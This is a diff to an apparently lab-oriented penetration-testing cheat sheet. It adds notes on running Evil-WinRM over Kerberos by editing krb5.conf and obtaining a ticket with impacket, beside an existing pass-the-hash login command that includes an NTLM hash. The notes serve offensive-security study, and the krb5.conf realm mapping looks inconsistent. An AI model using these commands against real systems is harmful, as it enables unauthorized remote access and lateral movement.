@@ -480,6 +480,28 @@ evil-winrm -i 10.10.113.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
 Also,
 - `upload <filename>`
 - `download <filename>`
+**If you want to use the Evil-WinRM via Kerberos authentication (in case NTLM is disabled), you need to change the `/etc/krb5.conf` file:**
+```
+[libdefaults]
+    default_realm = DOMAIN.LOCAL
+
+[realms]
+    DOMAIN.LOCAL = {
+      kdc = dc1.domain.local
+    }
+
+[domain_realm]
+    .domain.local = REALCORP.HTB
+    domain.local = REALCORP.HTB
+```
+After that:
+- impacket-gettgt
+- export file
+- verify
+Finally:
+```
+evil-winrm -r DOMAIN.LOCAL -i dc01.domain.local
+```
 
 ## Pass the Hash
 - this will not work for Kerberos authentication but only for servers or services using NTLM authentication.
